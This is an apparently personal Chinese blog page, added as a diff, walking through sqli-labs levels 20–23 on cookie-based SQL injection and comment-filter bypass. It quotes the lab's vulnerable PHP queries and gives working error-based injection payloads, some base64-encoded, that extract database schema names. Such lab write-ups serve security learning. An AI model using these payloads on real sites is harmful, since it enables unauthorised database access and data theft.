@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="description" content="sqli-labs20-30">
+
+
+
+
+  <meta name="keywords" content="sql注入,">
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Hades">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1">
+
+
+
+<link rel="canonical" href="http://yoursite.com/2019/08/16/sqli-labs20-30/">
+
+
+<meta name="description" content="20-22cookie注入第二十题后台主要代码：$sql=&amp;quot;SELECT * FROM users WHERE username=&amp;#39;$cookee&amp;#39; LIMIT 0,1&amp;quot;; 在第一次登陆验证以后会将第二次的cookie值带入数据库进行查询，可以利用第二次的cookie值进行注入。 payload1：uname=admin&amp;#39;&amp;amp;passwd=1 pa">
+<meta name="keywords" content="sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs20-30">
+<meta property="og:url" content="http://yoursite.com/2019/08/16/sqli-labs20-30/index.html">
+<meta property="og:site_name" content="Hades">
+<meta property="og:description" content="20-22cookie注入第二十题后台主要代码：$sql=&amp;quot;SELECT * FROM users WHERE username=&amp;#39;$cookee&amp;#39; LIMIT 0,1&amp;quot;; 在第一次登陆验证以后会将第二次的cookie值带入数据库进行查询，可以利用第二次的cookie值进行注入。 payload1：uname=admin&amp;#39;&amp;amp;passwd=1 pa">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-08-20T07:39:08.738Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs20-30">
+<meta name="twitter:description" content="20-22cookie注入第二十题后台主要代码：$sql=&amp;quot;SELECT * FROM users WHERE username=&amp;#39;$cookee&amp;#39; LIMIT 0,1&amp;quot;; 在第一次登陆验证以后会将第二次的cookie值带入数据库进行查询，可以利用第二次的cookie值进行注入。 payload1：uname=admin&amp;#39;&amp;amp;passwd=1 pa">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
+<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+
+
+  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css">
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: ture
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> sqli-labs20-30 - Hades </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Hades</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          sqli-labs20-30
+        
+      </h1>
+
+      <time class="post-time">
+          8月 16 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h3 id="20-22cookie注入"><a href="#20-22cookie注入" class="headerlink" title="20-22cookie注入"></a>20-22cookie注入</h3><p>第二十题后台主要代码：<code>$sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;</code></p>
+<p>在第一次登陆验证以后会将第二次的cookie值带入数据库进行查询，可以利用第二次的cookie值进行注入。</p>
+<p>payload1：<code>uname=admin&#39;&amp;passwd=1</code></p>
+<p>payload2：<code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) --+</code></p>
+<p>第二十一题后台主要代码：<code>$cookee = base64_decode($cookee);$sql=&quot;SELECT * FROM users WHERE username=(&#39;$cookee&#39;) LIMIT 0,1&quot;;</code></p>
+<p>与第20题原理一样，只是需要对括号进行闭合，以及base64编码。</p>
+<p>payload1：<code>uname=admin&#39;)&amp;passwd=1</code></p>
+<p>payload2：<code>uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBzY2hlbWFfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSBsaW1pdCAwLDEpLDB4N2UpKSAj</code></p>
+<p>第二十二题后台主要代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$cookee1 = &apos;&quot;&apos;. $cookee. &apos;&quot;&apos;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>需要对引号闭合，但是第一此登录可以不用管闭合的事情。</p>
+<p>payload1：<code>uname=admin&amp;passwd=1</code></p>
+<p>payload2：<code>:uname=YWRtaW4nIiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBzY2hlbWFfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSBsaW1pdCAwLDEpLDB4N2UpKSAj</code></p>
+<h3 id="23对注释过滤"><a href="#23对注释过滤" class="headerlink" title="23对注释过滤"></a>23对注释过滤</h3><p>第二十三题后台主要代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$reg = &quot;/#/&quot;;</span><br><span class="line">$reg1 = &quot;/--/&quot;;</span><br><span class="line">$replace = &quot;&quot;;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);   //正则匹配$id中的$reg1字符串替换为$replace</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>只要不用注释闭合后面的单引号就可以 </p>
+<p>payload：``</p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/sql注入/">sql注入</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2019/08/16/基于centos的linux学习5/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">基于centos的linux学习5</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/08/15/sqli-labs1-20/">
+        <span class="next-text nav-default">sqli-labs1-20</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2019
+    <span class="footer-author">Hades.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+  
+
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tororo"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
